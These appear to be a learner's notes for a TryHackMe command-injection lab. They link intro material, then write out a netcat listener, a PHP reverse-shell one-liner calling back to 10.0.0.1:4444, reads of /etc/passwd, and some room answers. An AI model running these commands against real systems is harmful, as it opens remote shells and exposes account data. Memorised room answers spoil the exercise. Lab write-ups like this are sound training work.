
## Day-1 Injection

**set up openvpn if now known about that go through openvpn room at tryhackme**

[OpenVPN](https://www.tryhackme.com/room/openvpn)

### SQL Injection

[SQL Injection](https://www.w3schools.com/sql/sql_injection.asp)

**Above is breif intro to sql injection**

[SQL Injection](https://www.guru99.com/learn-sql-injection-with-practical-example.html)

**SQL Injection is quite popular attack type and easy to work out**

### OS Command Injection

**Quite interesting and if we are able to setup reverse shell then it's in our hands**

[Command Injection](https://snyk.io/blog/command-injection/)

[OS Command Injection](https://www.whitehatsec.com/glossary/content/os-command-injection)

## Command Injection Practical

**Here we can learn that we should not keep passthru function and others which will execute the entered text directly because it might contain malacious code**

[passthru php](https://www.php.net/manual/en/function.passthru.php)

**So now here either we can use direct shell from the website mentioned over there or we can put commands from our Terminal let's try to do with our terminal**

**First go to your terminal and type**

```
nc -nlvp 4444
```

Here you can choose any port but 4444 easy .

**Next thing is about go to the website over there link given in the room and put below command in the window and click the button nothing will happen there but you will see now there is command shell opened in your nc opened terminal.**

```php
php -r '$sock=fsockopen("10.0.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

**Here in the above command use your tun0 ip add. in place of 10.0.0.1 and put nc listener**


What strange text file is in the website root directory?

```
ls
```

**listed files contain weird named file**

How many non-root/non-service/non-daemon users are there?

```
0
```

**execute**

```
cat /etc/passwd
```

**The above command lists out the users**

**and we see that their is no such user with given properties**

What user is this app running as?

```
whoami
```

**will tell you the current user**

What is the user's shell set as?

**Again go to /etc/passwd**

```
cat /etc/passwd
```
**And see what are the things written in front of your current id already found out with whoami**

What version of Ubuntu is running?

```
lsb_release -a
```

Print out the MOTD.  What favorite beverage is shown?

**search for motd in linux google it and you will come to know what it is**

Further you can locate the file motd
```
locate motd
```
